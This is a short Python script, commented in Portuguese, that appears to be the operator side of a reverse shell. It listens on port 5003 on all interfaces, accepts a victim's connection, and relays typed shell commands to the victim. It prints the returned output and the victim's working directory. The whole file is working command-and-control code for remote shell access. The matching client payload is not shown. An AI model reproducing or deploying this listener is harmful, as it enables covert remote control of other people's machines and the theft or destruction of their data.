import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # tamanho máximo de mensagens que pode ser almentado

# separador para envio de 2 mensagens de uma vez
SEPARATOR = "<sep>"

# criar um objeto socket
s = socket.socket()

# linkar sockets à todos IPs deste host
s.bind((SERVER_HOST, SERVER_PORT))


# Escuta
s.listen(5)
print(f'Listening as {SERVER_HOST}:{SERVER_PORT}...')

# aceitar qualquer tentativa de conexão
client_socket, client_address = s.accept()
print(f'{client_address[0]}:{client_address[1]} Connected!') 

# receber o diretório atual do cliente
cwd = client_socket.recv(BUFFER_SIZE).decode()
print('[+] Current working directory: ', cwd)

# mandar comandos shell e resgatar os resultados
while True:
    # resgatar comando da shell
    command = input(f'{cwd} $> ')
    if not command.strip():
        # comando vazio
        continue

    # mandar comando ao cliente
    client_socket.send(command.encode())
    if command.lower() == 'exit':
        # se o comando for exit, sairá do loop
        break
    # receber resultado dos comandos
    output = client_socket.recv(BUFFER_SIZE).decode()
    # separa a saída do comando e o diretório atual
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
